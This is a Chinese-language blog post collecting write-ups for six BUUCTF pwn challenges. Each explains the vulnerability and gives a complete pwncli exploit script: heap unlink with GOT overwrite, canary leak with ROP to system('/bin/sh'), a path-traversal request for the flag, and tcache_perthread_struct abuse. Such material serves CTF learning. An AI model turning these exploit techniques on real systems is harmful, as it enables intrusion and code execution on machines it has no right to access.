# BUUCTF-pwn合集



# 简介

`buuctf-pwn-wp`合集

<!-- more -->

## shanghai2019_slient_note

### checksec

![image-20220415204351777](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220415204351777.png)

远程为`libc-2.27.so`

### 利用思路

固定分配`0x208`和`0x28`，且使用`calloc`，也就是不会从`tcache bins`里面取`chunk`。刚开始想用`fastbin attack`，发现没有合适的大小的`chunk`可以使用，使用改用`unlink`。

利用过程：

- 依次分配`0x208`和`0x28`

- 释放`8`次`0x210`大小的`chunk`，就得到一个`unsortedbin chunk`
- 继续分配`0x28`大小，这时候会切割`unsortedbin chunk`，这样往`large ptr`指向的内存写的时候，就可以修改`small ptr`指向的`chunk`
- 伪造`chunk`，触发`unlink`
- `leak addr`然后修改`got`表即可

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

small = 1
large = 2

def add(t, data="deadbeef", add_lf=True):
    sla("Exit\n", "1")
    sla("add?\n", str(t))
    if add_lf:
        sla("Content:\n", data)
    else:
        sa("Content:\n", data)


def delete(t):
    sla("Exit\n", "2")
    sla("delete?\n", str(t))


def update(t, data="deadbeef", add_lf=True):
    sla("Exit\n", "3")
    sla("update?\n", str(t))
    if add_lf:
        sla("Content:\n", data)
    else:
        sa("Content:\n", data)



# prepare for unlink
add(large, flat({
    0xb0:[
        0, 0x21, 0, 0
    ] * 3
}))
add(small)

# make an unsortedbin chunk
for _ in range(8):
    delete(large)

# overlap
add(small)
add(small)

# overwrite
update(large, flat([
    0, 0x21,
    0x6020d8-0x18, 0x6020d8-0x10,
    0x20, 0x90
]))

# unlink
for i in range(8):
    delete(small)

update(large, flat([
    "/bin/sh\x00", 0, 
    elf.got.free, elf.got.setvbuf
]))

# write free@got
update(small, p64(elf.plt.puts))

# leak libc addr
delete(large)
set_current_libc_base_and_log(addr=recv_current_libc_addr(), offset=libc.sym.setvbuf)

update(small, p64(libc.sym.system))

update(large, "/bin/sh")

delete(2)

sleep(1)
sl("cat flag")

ia()
```

远程打：

![image-20220415220240590](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220415220240590.png)

## httc_tjctf_2016

这一题远程好像打不通，估计远程没有`/home/app/web`这个目录。变量未初始化的漏洞有时候确实有点难发现......对这类漏洞感觉还是不是很敏感。

### 漏洞点

找了半天，后来动态调试的时候才发现漏洞。变量未初始的漏洞，导致字符串拼接，可以读取`flag`。

![image-20220416000030279](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220416000030279.png)

也就是说，当把`url`填满`0x32`的时候，由于没有添加`\x00`结束符，`filename`还会继续往后拼接，直到`0x64`处为`\x00`。那么用`gdb`动调以下：

![image-20220416002824866](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220416002824866.png)

由此，根据偏移，写出`exp`即可。

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']

payload = "GET" + " " # method
payload += "//" + "./" * 24 + " " # url
payload += "a" * 9 + "\n" # version
payload += cyclic(50).decode() + ": "
payload += "X"*33 + "../../../flag\x00" + "\n\n"

s(payload)

ia()
```

![image-20220416003225604](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220416003225604.png)

泄露出`flag`：

![image-20220416003247025](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220416003247025.png)





## whctf2017_rc4

### 漏洞点

在`generate_key`函数中，如果选择不为`a`或者`b`，就有一个变量位未初始化的漏洞：

![image-20220416203159327](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220416203159327.png)

然而，每次的`key`都会打印出来：

![image-20220416203325078](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220416203325078.png)

还有一个栈溢出：

![image-20220416204436257](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220416204436257.png)



### 利用思路

- 利用未初始化的漏洞泄露出`canary`
- 栈溢出执行`rop`



### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

# generate key
sla("> ", "a")
sla("> ", "b")

# leave canary on stack
sla("> ", "b")
sl("deadbeef")

# leak canary
sla("> ", "a")
sla("> ", "f")

m  = rl()
canary = bytes.fromhex(m[-17:-1].decode())
canary = int.from_bytes(canary, "little")
log_address("canary", canary)

read_input_addr = 0x400d37

data = flat({
    0x108: canary,
    0x118:[
        CurrentGadgets.pop_rdi_ret(),
        elf.got.puts,
        elf.plt.puts,
        CurrentGadgets.pop_rdi_ret(),
        elf.got.rand,
        CurrentGadgets.pop_rsi_r15_ret(),
        0x20, 0,
        read_input_addr,
        CurrentGadgets.pop_rdi_ret(),
        elf.got.rand+8,
        elf.plt.rand
    ]
})

sla("> ", "b")
sl(data)

sla("> ", "d")
sl("n")
set_current_libc_base_and_log(recv_current_libc_addr(), offset=libc.sym.puts)

sl(p64_ex(libc.sym.system) + b"/bin/sh;")

sleep(0.5)
sl("cat /flag")


ia()
```

远程打：

![image-20220416214406513](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220416214406513.png)



## inndy_fast

就是除法用`python`写的会有点问题，写个程序调用一下即可，其他的都可以用`python`解决。

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']


sla("game.\n", "Yes I know")

res = []

calc = process("./calc")

for i in range(10000):
    m = rl()
    n1, op, n2, *_ = m.split()
    n1 = int_ex(n1)
    n2 = int_ex(n2)
    op = op.decode()
    if op == "+":
        tmp = n1 + n2
    elif op == "-":
        tmp = n1 - n2
    elif op == "*":
        tmp = n1 * n2
    elif op == "/":
        calc.sendlineafter("code: ", f"{n1} {op} {n2}")
        calc.recvuntil("The result: ")
        tmp = calc.recvline()
        tmp = int_ex(tmp)
        res.append(tmp)
        continue
    else:
        error("WHF!")
    tmp &= 0xffffffff
    if tmp >= 0x7fffffff:
        tmp -= (1 << 32)
    res.append(tmp)

calc.sendlineafter("code: \n", "quit")
calc.close()

for x in res:
    sl(str(x))

ia()
```

然后辅助的`calc.c`：

```c
// gcc calc.c -o calc
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

void main()
{
    char buf[0x1000] = {0};
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    int n1, n2, res;
    char op;
    while (1)
    {
        puts("please input your code: ");
        memset(buf, 0, 0x100);
        read(0, buf, 0x100);
        if (!strncmp(buf, "quit", 4)) {
            puts("bye!");
            return;
        }
        sscanf(buf, "%d %c %d\n", &n1, &op, &n2);
        switch (op)
        {
        case '+':
            res = n1 + n2;
            break;
        case '-':
            res = n1 - n2;
            break;
        case '*':
            res = n1 *n2;
            break;
        case '/':
            res = n1 / n2;
            break;
        default:
            puts("error!");
            return;
        }
        
        printf("The result: %d\n", res);
    }
    
}
```



远程打：

![image-20220416231852136](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220416231852136.png)





## asis_finals_2019_rop13

基本的`rop`的题目

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

assign = 0x400426
ppr = 0x40047e

s(b"\x00" + flat({
    71: [
        assign,
        ppr,
        1,
        elf.got.write,
        ppr,
        0x8,
        0,
        elf.plt.write,
        assign,
        ppr,
        0,
        elf.got.exit,
        ppr, 
        0x10,
        0,
        elf.plt.read,
        assign,
        elf.plt.exit,
        elf.got.exit + 8
    ]
}))

set_current_libc_base_and_log(recv_current_libc_addr(), libc.sym.write)

s(p64(libc.sym.system) + b"/bin/sh;")

ia()
```



远程打：

![image-20220417190610252](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220417190610252.png)

## xp0intctf_2018_fast

利用`tcacthe_perthread_struct`这个结构体，释放掉，然后任意地址分配，这里选择泄露处`flag`即可。

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


def add(size, data="deadbeef"):
    sla("> ", "1")
    sla("Size: ", str(size))
    sa("Name: ", data)
    m1 = rls("Name:")
    m2 = rls("Addr:")
    m2 = int16_ex(m2[6:])
    log_ex(f"Get address: {hex(m2)}")
    return m1, m2

def delete(addr: int):
    sla("> ", "2")
    sla("Addr: ", hex(addr))

sla("note:", "roderick")
_, heap_addr = add(0x10)
heap_base = heap_addr - 0x14a0
log_heap_base_addr(heap_base)

# free tcache_perthread_struct
delete(heap_base+0x10)

add(0x240, b"\x01" + b"\x00" * 0x3f + p64_ex(heap_base + 0x490))
needed, _ = add(0x10, "f")
log_ex(f"Get flag: {needed}")

ia()
```

远程打：

![image-20220417192334361](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220417192334361.png)



# 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2022-04-15-buuctf-pwn-tasks-20/  

